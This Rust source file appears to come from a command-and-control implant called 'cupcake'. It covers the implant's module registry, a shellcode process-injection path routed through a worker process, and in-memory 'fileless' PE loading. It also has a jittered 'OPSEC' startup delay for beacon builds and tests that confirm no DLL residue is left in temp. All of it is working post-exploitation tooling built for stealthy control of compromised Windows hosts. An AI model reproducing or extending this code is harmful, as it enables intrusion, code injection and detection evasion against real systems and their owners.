    let data_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, shellcode);
    let payload = serde_json::json!({
        "pid": pid,
        "data": data_b64,
        "method": method,
        "wait_ms": wait_ms,
    });
    let bytes = serde_json::to_vec(&payload).map_err(|e| e.to_string())?;
    invoke_inject_json("process_inject", &bytes)
}

/// Inject with a pre-built JSON body — always process-isolated worker path.
pub fn invoke_inject_json(cmd_type: &str, json_body: &[u8]) -> Result<CommandResult, String> {
    ensure_module_for_command(cmd_type)?;
    // Product isolation: never registry().invoke(MOD_INJECT) — that would map an
    // in-process DLL. Route through ModuleSupervisor → self-contained worker EXE.
    if !registry().is_loaded(MOD_INJECT)
        && !crate::module_supervisor::supervisor().is_ready(MOD_INJECT)
    {
        return Err(format!("module_required:{MOD_INJECT}"));
    }
    // The staged inject module PE doubles as the sacrificial worker host.
    if crate::module_supervisor::supervisor()
        .get_pe(MOD_INJECT)
        .is_none()
    {
        return Err(format!(
            "module_required:{MOD_INJECT} (worker PE missing)"
        ));
    }
    let deadline_ms = 60_000u64;
    let r = crate::module_supervisor::supervisor().execute_inject_json(json_body, deadline_ms);
    if !r.stderr.is_empty() && r.stdout.is_empty() {
        return Err(r.stderr);
    }
    Ok(r)
}

/// Handle module_stage / module_push: id from path/content, data = base64 CKMS.
///
/// For product worker modules (`inject` / `ad`), success means PE bytes are cached
/// for on-demand CreateProcess — **not** a long-lived resident process. UI should
/// treat this as "staged/ready", not "process alive".
pub fn handle_module_stage(id: &str, b64_or_raw: &[u8], is_base64: bool) -> Result<String, String> {
    let blob = if is_base64 {
        base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64_or_raw)
            .map_err(|e| format!("base64 decode: {e}"))?
    } else {
        b64_or_raw.to_vec()
    };
    registry().stage_bytes(id, &blob)?;
    registry().load(id)?;
    let mode = registry().load_mode_of(id);
    Ok(format!("module {id} staged+loaded mode={mode}"))
}

/// Stage0 OPSEC: startup delay with jitter before first connect.
/// When sleep template is 0, still apply a small default delay for beacon builds.
pub fn stage0_startup_delay_ms() -> u64 {
    let configured = crate::config::get_sleep_time();
    let base = if configured > 0 {
        configured * 1000
    } else {
        // Default OPSEC delay ~3–12s when unset (beacon)
        3000
    };
    // Jitter ±30% using PRNG
    let j = crate::utils::next_u32() as u64 % 61; // 0..60
    let factor = 70 + j; // 70%..130%
    let ms = base.saturating_mul(factor) / 100;
    // Clamp 1s .. 2h
    ms.max(1000).min(7_200_000)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::module_package::{default_module_key, pack_module};
    use std::path::PathBuf;
    use std::sync::Mutex;

    /// Serialize tests that touch global registry / key_override.
    fn test_lock() -> std::sync::MutexGuard<'static, ()> {
        static LOCK: Mutex<()> = Mutex::new(());
        lock_map(&LOCK, "module_registry")
    }

    #[test]
    fn daily_ops_are_not_modules() {
        // Terminal / file / process are built-in (post-ex), not L2 modules
        assert_eq!(module_for_command("shell"), None);
        assert_eq!(module_for_command("shell_interactive"), None);
        assert_eq!(module_for_command("file_list"), None);
        assert_eq!(module_for_command("file_ls"), None);
        assert_eq!(module_for_command("process_list"), None);
        assert_eq!(module_for_command("register"), None);
        // Heavy capabilities remain module-gated
        // Classic BOF: always gated on in-process mod_bof (Manual-Map, fileless)
        assert_eq!(module_for_command("bof_exec"), Some(MOD_BOF));
        // .NET execution retired — no module gate; handler directs to shellcode+inject
        assert_eq!(module_for_command("execute_assembly"), None);
        assert_eq!(module_for_command("plugin_exec"), Some(MOD_PLUGIN));
        assert_eq!(module_for_command("process_inject"), Some(MOD_INJECT));
        assert_eq!(module_for_command("shellcode_inject"), Some(MOD_INJECT));
        assert_eq!(module_for_command("inject"), Some(MOD_INJECT));
    }

    #[test]
    fn ensure_fails_when_absent() {
        let _g = test_lock();
        let _ = registry().unload(MOD_BOF);
        let r = ensure_module_for_command("bof_exec");
        assert!(r.is_err());
        assert!(r.unwrap_err().contains("module_required"));
    }

    #[test]
    fn stage_verify_load_hosted_invoke_unload() {
        let _g = test_lock();
        let key = default_module_key();
        registry().set_key_override(Some(key));
        let id = "shell_test_hosted";
        let _ = registry().unload(id);
        let payload = b"HOST";
        let blob = pack_module(id, payload, &key).unwrap();
        registry().stage_bytes(id, &blob).unwrap();
        registry().load(id).unwrap();
        assert!(registry().is_loaded(id));
        let r = registry().invoke(id, "shell", b"whoami").unwrap();
        assert!(r.stdout.contains("hosted:"));
        registry().unload(id).unwrap();
        assert!(!registry().is_loaded(id));
        registry().set_key_override(None);
    }

    #[test]
    fn startup_delay_in_range() {
        let ms = stage0_startup_delay_ms();
        assert!(ms >= 1000);
        assert!(ms <= 7_200_000);
    }

    /// Optional PE load: set CUPCAKE_TEST_MOD_SHELL to path of cupcake_mod_shell.dll
    /// Uses LoadLibrary path (APP_MEM_MAP=0) so CRT/TLS is handled by OS loader.
    /// Isolated: clears strict env; always unload + clear key even on failure mid-test.
    #[test]
    fn load_real_shell_dll_if_present() {
        let _g = test_lock();
        // Isolate from other tests that toggle mem-map flags
        std::env::remove_var("APP_MEM_MAP_STRICT");
        std::env::set_var("APP_MEM_MAP", "0");
        let path = match std::env::var("CUPCAKE_TEST_MOD_SHELL") {
            Ok(p) if !p.is_empty() => p,
            _ => {
                let candidates = [
                    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                        .join("../target/release/cupcake_mod_shell.dll"),
                    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                        .join("../../Client/target/release/cupcake_mod_shell.dll"),
                    PathBuf::from("../target/release/cupcake_mod_shell.dll"),
                    PathBuf::from("target/release/cupcake_mod_shell.dll"),
                ];
                let found = candidates.into_iter().find(|p| p.is_file());
                match found {
                    Some(p) => p.to_string_lossy().into_owned(),
                    None => {
                        eprintln!("skip: no mod_shell dll (set CUPCAKE_TEST_MOD_SHELL)");
                        std::env::remove_var("APP_MEM_MAP");
                        return;
                    }
                }
            }
        };
        let pe = match std::fs::read(&path) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("skip read {path}: {e}");
                std::env::remove_var("APP_MEM_MAP");
                return;
            }
        };
        if pe.len() < 64 || pe[0] != b'M' {
            eprintln!("skip: not PE");
            std::env::remove_var("APP_MEM_MAP");
            return;
        }
        let key = default_module_key();
        registry().set_key_override(Some(key));
        // Unique id so we do not collide with MOD_SHELL used by other tests
        let id = "shell_pe_e2e";
        let _ = registry().unload(id);
        let blob = pack_module(id, &pe, &key).expect("pack");
        registry().stage_bytes(id, &blob).expect("stage");
        let load_res = registry().load(id);
        if let Err(e) = load_res {
            let _ = registry().unload(id);
            registry().set_key_override(None);
            std::env::remove_var("APP_MEM_MAP");
            panic!("load PE module failed: {e}");
        }
        assert!(registry().is_loaded(id));
        let mode = registry().load_mode_of(id);
        assert_eq!(mode, "legacy", "MEM_MAP=0 must use LoadLibrary path");
        let r = registry()
            .invoke(id, "shell", b"help")
            .expect("invoke help");
        // Require substantive hybrid builtin help text (matches executor::BUILTIN_HELP)
        let out = format!("{}{}", r.stdout, r.stderr).to_ascii_uppercase();
        assert!(
            out.contains("CD")
                && (out.contains("DIR") || out.contains("TASKLIST") || out.contains("HELP")),
            "mod_shell help must return hybrid builtin help text; got stdout={:?} stderr={:?}",
            r.stdout,
            r.stderr
        );
        let r2 = registry()
            .invoke(id, "shell", b"echo cupcake_mod_shell_ok")
            .expect("invoke echo");
        assert!(
            r2.stdout.contains("cupcake_mod_shell_ok"),
            "echo builtin must echo marker; stdout={:?} stderr={:?}",
            r2.stdout,
            r2.stderr
        );
        registry().unload(id).expect("unload");
        assert!(!registry().is_loaded(id));
        registry().set_key_override(None);
        std::env::remove_var("APP_MEM_MAP");
        eprintln!("OK real PE load+invoke(help+echo)+unload via {path} load_mode={mode}");
    }

    #[test]
    fn heavy_cmds_require_modules_when_absent() {
        let _g = test_lock();
        let _ = registry().unload(MOD_BOF);
        let r = ensure_module_for_command("bof_exec");
        assert!(r.is_err(), "expected module_required when bof absent");
        assert!(
            r.unwrap_err().contains("module_required"),
            "error must mention module_required"
        );
        // Daily ops never require module load
        assert!(ensure_module_for_command("shell").is_ok());
        assert!(ensure_module_for_command("file_ls").is_ok());
        assert!(ensure_module_for_command("process_list").is_ok());
    }

    #[test]
    fn list_loaded_exposes_load_mode() {
        let _g = test_lock();
        let key = default_module_key();
        registry().set_key_override(Some(key));
        let id = "mode_stub_test";
        let _ = registry().unload(id);
        let blob = pack_module(id, b"HOST", &key).unwrap();
        registry().stage_bytes(id, &blob).unwrap();
        registry().load(id).unwrap();
        assert_eq!(registry().load_mode_of(id), "stub");
        let listed = registry().list_loaded();
        assert!(
            listed.iter().any(|s| s == &format!("{id}:stub")),
            "list_loaded must include id:mode, got {listed:?}"
        );
        registry().unload(id).unwrap();
        registry().set_key_override(None);
    }

    /// Bad PE + strict: fail closed without creating cpx_*.dll under temp.
    #[test]
    fn strict_bad_pe_no_temp_cpx_dll() {
        let _g = test_lock();
        #[cfg(all(windows, feature = "mem-map"))]
        {
            std::env::set_var("APP_MEM_MAP_STRICT", "1");
            std::env::set_var("APP_MEM_MAP", "1");
            let tmp = std::env::temp_dir();
            let before: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
                .into_iter()
                .flatten()
                .flatten()
                .filter_map(|e| {
                    let n = e.file_name().to_string_lossy().into_owned();
                    // Legacy cpx_ prefix + current ~DF* stage names
                    if (n.starts_with("cpx_") || n.starts_with("~DF"))
                        && (n.ends_with(".dll") || n.ends_with(".tmp"))
                    {
                        Some(n)
                    } else {
                        None
                    }
                })
                .collect();

            // Minimal fake PE that fails Manual-Map (valid MZ/PE skeleton, no sections)
            let mut pe = vec![0u8; 0x200];
            pe[0] = b'M';
            pe[1] = b'Z';
            pe[0x3C] = 0x80; // e_lfanew
            pe[0x80] = b'P';
            pe[0x81] = b'E';
            pe[0x82] = 0;
            pe[0x83] = 0;
            // Machine amd64
            pe[0x84] = 0x64;
            pe[0x85] = 0x86;
            // Optional magic PE32+
            pe[0x80 + 24] = 0x0B;
            pe[0x80 + 25] = 0x02;

            let key = default_module_key();
            registry().set_key_override(Some(key));
            let id = "strict_bad_pe";
            let _ = registry().unload(id);
            let blob = pack_module(id, &pe, &key).unwrap();
            registry().stage_bytes(id, &blob).unwrap();
            let err = registry().load(id).unwrap_err();
            assert!(
                err.contains("mem-map")
                    || err.contains("pe_map")
                    || err.contains("strict")
                    || err.contains("PE")
                    || err.contains("export")
                    || err.contains("alloc")
                    || err.contains("machine")
                    || err.contains("signature")
                    || err.contains("SizeOf")
                    || err.contains("bad"),
                "expected mem-map failure, got: {err}"
            );
            assert!(!registry().is_loaded(id));

            let after: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
                .into_iter()
                .flatten()
                .flatten()
                .filter_map(|e| {
                    let n = e.file_name().to_string_lossy().into_owned();
                    if (n.starts_with("cpx_") || n.starts_with("~DF"))
                        && (n.ends_with(".dll") || n.ends_with(".tmp"))
                    {
                        Some(n)
                    } else {
                        None
                    }
                })
                .collect();
            let new_files: Vec<_> = after.difference(&before).collect();
            assert!(
                new_files.is_empty(),
                "strict mode must not create stage dll/tmp: {new_files:?}"
            );

            registry().set_key_override(None);
            std::env::remove_var("APP_MEM_MAP_STRICT");
        }
    }

    fn find_product_l2_pe() -> Option<PathBuf> {
        if let Ok(p) = std::env::var("CUPCAKE_TEST_MOD_PE") {
            let pb = PathBuf::from(p);
            if pb.is_file() {
                return Some(pb);
            }
        }
        let root = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
        [
            root.join("../../server/storage/modules/bof.bin"),
            root.join("../target/release/app_rt.dll"),
            root.join("../target/release/cupcake_mod_bof.dll"),
            PathBuf::from("server/storage/modules/bof.bin"),
        ]
        .into_iter()
        .find(|p| p.is_file())
    }

    /// Stage product L2 PE with mem-map (inject — never shell.bin).
    #[test]
    fn stage_product_bin_from_storage_if_present() {
        let _g = test_lock();
        std::env::remove_var("APP_MEM_MAP_STRICT");
        std::env::remove_var("APP_MEM_MAP");
        let Some(path) = find_product_l2_pe() else {
            eprintln!("skip: no product L2 PE (inject); set CUPCAKE_TEST_MOD_PE");
            return;
        };
        let pe = std::fs::read(&path).expect("read product pe");
        let key = default_module_key();
        registry().set_key_override(Some(key));
        let id = "inject";
        let _ = registry().unload(id);

        let tmp = std::env::temp_dir();
        let before: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
            .into_iter()
            .flatten()
            .flatten()
            .filter_map(|e| {
                let n = e.file_name().to_string_lossy().into_owned();
                if n.starts_with("cpx_") && n.ends_with(".dll") {
                    Some(n)
                } else {
                    None
                }
            })
            .collect();

        let blob = pack_module(id, &pe, &key).expect("pack");
        registry().stage_bytes(id, &blob).expect("stage");
        registry()
            .load(id)
            .unwrap_or_else(|e| panic!("product PE registration must succeed: {e}"));
        assert!(registry().is_loaded(id));
        assert_eq!(registry().load_mode_of(id), "worker");
        assert!(crate::module_supervisor::supervisor().is_ready(id));
        registry().unload(id).expect("unload");
        assert!(!registry().is_loaded(id));

        let after: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
            .into_iter()
            .flatten()
            .flatten()
            .filter_map(|e| {
                let n = e.file_name().to_string_lossy().into_owned();
                if n.starts_with("cpx_") && n.ends_with(".dll") {
                    Some(n)
                } else {
                    None
                }
            })
            .collect();
        let residual: Vec<_> = after.difference(&before).collect();
        assert!(
            residual.is_empty(),
            "no durable cpx_*.dll residual after unload: {residual:?}"
        );
        registry().set_key_override(None);
        eprintln!("OK product PE registration from {}", path.display());
    }

    /// Direct pe_map success path (export-only) must not create cpx_*.dll.
    #[test]
    fn pe_map_success_path_no_cpx_dll() {
        let _g = test_lock();
        #[cfg(all(windows, feature = "mem-map"))]
        {
            let Some(path) = find_product_l2_pe() else {
                eprintln!("skip: no product L2 PE for pe_map residual test");
                return;
            };
            let pe = std::fs::read(&path).expect("read");
            let tmp = std::env::temp_dir();
            let before: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
                .into_iter()
                .flatten()
                .flatten()
                .filter_map(|e| {
                    let n = e.file_name().to_string_lossy().into_owned();
                    if n.starts_with("cpx_") && n.ends_with(".dll") {
                        Some(n)
                    } else {
                        None
                    }
                })
                .collect();
            let m = crate::pe_map::map_pe_opts(&pe, false).expect("pe_map success path");
            assert!(m.mod_invoke.is_some());
            crate::pe_map::unmap_pe(&m);
            let after: std::collections::HashSet<_> = std::fs::read_dir(&tmp)
                .into_iter()
                .flatten()
                .flatten()
                .filter_map(|e| {
                    let n = e.file_name().to_string_lossy().into_owned();
                    if n.starts_with("cpx_") && n.ends_with(".dll") {
                        Some(n)
                    } else {
                        None
                    }
                })
                .collect();
            let new_files: Vec<_> = after.difference(&before).collect();
            assert!(
                new_files.is_empty(),
                "pe_map success must not create cpx_*.dll: {new_files:?}"
            );
            eprintln!("OK pe_map success path no cpx residual (export probe)");
        }
    }
}
